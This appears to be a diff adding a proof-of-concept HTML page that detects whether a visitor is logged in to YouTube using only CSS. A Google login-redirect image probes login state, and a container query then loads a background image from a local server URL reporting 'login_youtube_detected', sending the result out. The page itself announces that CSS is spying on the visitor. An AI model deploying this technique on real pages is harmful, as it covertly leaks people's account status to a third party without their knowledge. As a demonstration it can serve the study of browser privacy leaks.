@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Container Query Fixed</title>
+    <style>
+        .wrapper {
+            display: inline-block;
+            width: max-content;
+            border: 5px solid gray;
+        }
+
+        .container-blue {
+            container-type: inline-size;
+            border: 5px solid black;
+            width: 100%;
+            display: block;
+        }
+
+        .div1 {
+            width: max-content;
+            border: 1px solid red;
+        }
+
+        .div2 {
+            padding: 10px;
+            border: 1px solid green;
+            background-color: lightgray;
+            transition: 0.3s;
+        }
+
+        @container (min-width: 17px) {
+            .div2 {
+                background-color: blue;
+                background-image: url('http://127.0.0.1:1337/?status=login_youtube_detected!');
+                color: white;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <h3>CSS spying you! are u logged in on youtube website ? </h3>
+    <div class="wrapper">
+        <div class="div1">
+            <img src="https://preview.redd.it/why-does-meliodas-have-four-separate-demon-marks-does-it-v0-y4b0x4jg5u5c1.jpg?width=640&crop=smart&auto=webp&s=0d37593767bc5a72966f9f17b6e5ea6c935bdcdd" width="300px">
+            <br>
+            <!-- pwned! -->
+            <img src="https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube" alt="">
+        </div>
+        <div class="container-blue">
+            <div class="div2">Meliodas</div>
+        </div>
+    </div>
+</body>
+
+</html>
